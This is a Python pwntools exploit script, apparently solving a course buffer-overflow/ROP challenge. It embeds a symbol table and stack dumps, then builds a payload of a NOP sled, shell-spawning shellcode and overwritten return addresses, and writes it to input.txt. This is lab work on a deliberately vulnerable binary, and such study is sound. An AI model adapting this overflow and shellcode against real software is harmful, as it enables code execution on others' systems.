from pwn import *


def get_bash():
    context.update(arch='x86_64', os='linux')
    return asm(shellcraft.sh())


"""
ce441chal@ce441chal ~/part2> objdump -t ROP
ROP:     file format elf32-i386

SYMBOL TABLE:
080481b4 l    d  .interp	00000000              .interp
080481c8 l    d  .note.gnu.build-id	00000000              .note.gnu.build-id
080481ec l    d  .note.gnu.property	00000000              .note.gnu.property
08048208 l    d  .note.ABI-tag	00000000              .note.ABI-tag
08048228 l    d  .gnu.hash	00000000              .gnu.hash
08048248 l    d  .dynsym	00000000              .dynsym
08048308 l    d  .dynstr	00000000              .dynstr
0804839e l    d  .gnu.version	00000000              .gnu.version
080483b8 l    d  .gnu.version_r	00000000              .gnu.version_r
080483f8 l    d  .rel.dyn	00000000              .rel.dyn
08048408 l    d  .rel.plt	00000000              .rel.plt
08049000 l    d  .init	00000000              .init
08049030 l    d  .plt	00000000              .plt
080490c0 l    d  .plt.sec	00000000              .plt.sec
08049140 l    d  .text	00000000              .text
0804950c l    d  .fini	00000000              .fini
0804a000 l    d  .rodata	00000000              .rodata
0804a118 l    d  .eh_frame_hdr	00000000              .eh_frame_hdr
0804a18c l    d  .eh_frame	00000000              .eh_frame
0804bf08 l    d  .init_array	00000000              .init_array
0804bf0c l    d  .fini_array	00000000              .fini_array
0804bf10 l    d  .dynamic	00000000              .dynamic
0804bff8 l    d  .got	00000000              .got
0804c000 l    d  .got.plt	00000000              .got.plt
0804c02c l    d  .data	00000000              .data
0804c034 l    d  .bss	00000000              .bss
00000000 l    d  .comment	00000000              .comment
00000000 l    d  .debug_aranges	00000000              .debug_aranges
00000000 l    d  .debug_info	00000000              .debug_info
00000000 l    d  .debug_abbrev	00000000              .debug_abbrev
00000000 l    d  .debug_line	00000000              .debug_line
00000000 l    d  .debug_str	00000000              .debug_str
00000000 l    df *ABS*	00000000              crtstuff.c
080491a0 l     F .text	00000000              deregister_tm_clones
080491e0 l     F .text	00000000              register_tm_clones
08049220 l     F .text	00000000              __do_global_dtors_aux
0804c034 l     O .bss	00000001              completed.7622
0804bf0c l     O .fini_array	00000000              __do_global_dtors_aux_fini_array_entry
08049250 l     F .text	00000000              frame_dummy
0804bf08 l     O .init_array	00000000              __frame_dummy_init_array_entry
00000000 l    df *ABS*	00000000              ROP.c
00000000 l    df *ABS*	00000000              crtstuff.c
0804a350 l     O .eh_frame	00000000              __FRAME_END__
00000000 l    df *ABS*	00000000              
0804bf0c l       .init_array	00000000              __init_array_end
0804bf10 l     O .dynamic	00000000              _DYNAMIC
0804bf08 l       .init_array	00000000              __init_array_start
0804a118 l       .eh_frame_hdr	00000000              __GNU_EH_FRAME_HDR
0804c000 l     O .got.plt	00000000              _GLOBAL_OFFSET_TABLE_
08049500 g     F .text	00000005              __libc_csu_fini
08049333 g     F .text	00000033              Access_Shell
08049190 g     F .text	00000004              .hidden __x86.get_pc_thunk.bx
0804c02c  w      .data	00000000              data_start
00000000       F *UND*	00000000              printf@@GLIBC_2.0
00000000       F *UND*	00000000              __isoc99_fscanf@@GLIBC_2.7
0804c038 g     O .bss	00000004              fp
00000000       O *UND*	00000000              stderr@@GLIBC_2.0
08049505 g     F .text	00000000              .hidden __x86.get_pc_thunk.bp
0804c034 g       .data	00000000              _edata
0804950c g     F .fini	00000000              .hidden _fini
00000000       F *UND*	00000000              fwrite@@GLIBC_2.0
0804c02c g       .data	00000000              __data_start
00000000       F *UND*	00000000              puts@@GLIBC_2.0
00000000  w      *UND*	00000000              __gmon_start__
00000000       F *UND*	00000000              exit@@GLIBC_2.0
0804c030 g     O .data	00000000              .hidden __dso_handle
0804a004 g     O .rodata	00000004              _IO_stdin_used
08049366 g     F .text	000000ab              read_file
00000000       F *UND*	00000000              __libc_start_main@@GLIBC_2.0
00000000       F *UND*	00000000              execve@@GLIBC_2.0
08049490 g     F .text	00000065              __libc_csu_init
0804929e g     F .text	00000095              wrong_answer
00000000       F *UND*	00000000              fopen@@GLIBC_2.1
0804c048 g       .bss	00000000              _end
08049180 g     F .text	00000005              .hidden _dl_relocate_static_pie
08049140 g     F .text	0000003b              _start
0804a000 g     O .rodata	00000004              _fp_hw
0804c034 g       .bss	00000000              __bss_start
08049411 g     F .text	0000006e              main
0804947f g     F .text	00000000              .hidden __x86.get_pc_thunk.ax
08049256 g     F .text	00000048              correct_answer
0804c03c g     O .bss	0000000a              bin_sh
0804c034 g     O .data	00000000              .hidden __TMC_END__
08049000 g     F .init	00000000              .hidden _init

"""
"""
esp            0xffffd490
0xffffd504:     0x0804c000      0xffffd528      0x0804946d      0xffffd741
0xffffd514:     0xffffd5d4      0xffffd5e0      0x08049429      0xffffd540
0xffffd524:     0x00000000      0x00000000      0xf7df5ee5      0xf7fbe000
0xffffd534:     0xf7fbe000      0x00000000      0xf7df5ee5      0x00000002
0xffffd544:     0xffffd5d4      0xffffd5e0      0xffffd564      0xf7fbe000
0xffffd554:     0x00000000      0xffffd5b8      0x00000000      0xf7ffd000
0xffffd564:     0x00000000      0xf7fbe000      0xf7fbe000      0x00000000
0xffffd574:     0x994d1a19      0xd85adc09      0x00000000      0x00000000
0xffffd584:     0x00000000      0x00000002      0x08049140      0x00000000
0xffffd594:     0xf7fe7ad4      0xf7fe22d0      0x0804c000      0x00000002
0xffffd5a4:     0x08049140      0x00000000      0x08049176      0x08049411
"""
p = make_packer(32, endian='little', sign='unsigned')
# sh = process(["./ROP", '%016lx-' * 23])
# print("--->", sh.recvall(timeout=1))

# Table:
correct_answer = 0x08049274
ebp = 0xffffd528

"""
0xffffd50c:     0x0804946d      0xffffd741      0xffffd5d4      0xffffd5e0
0xffffd51c:     0x08049429      0xffffd540      0x00000000      0x00000000
0xffffd52c:     0xf7df5ee5      0xf7fbe000
"""

# variables:
expected_input_correct_answer = 0xdabbadaa
# ---  generate input.txt   --- &input = 0xffffd49c
buffer_start = 0xffffd49c
bash = get_bash()
amo = b"\x90" * (100 - len(bash)) + bash
amo += b"\x90" * 8
amo += p(buffer_start + 108+1*4) + p(correct_answer)
amo += p(ebp) + p(0x10203040) + p(expected_input_correct_answer)
# amo += p(ebp) + p(0x0804946d)
print(amo)

f = open("input.txt", "wb")
f.write(amo)
f.close()
# contine execution
# print("--->", sh.recvall(timeout=1))
# sh.interactive()
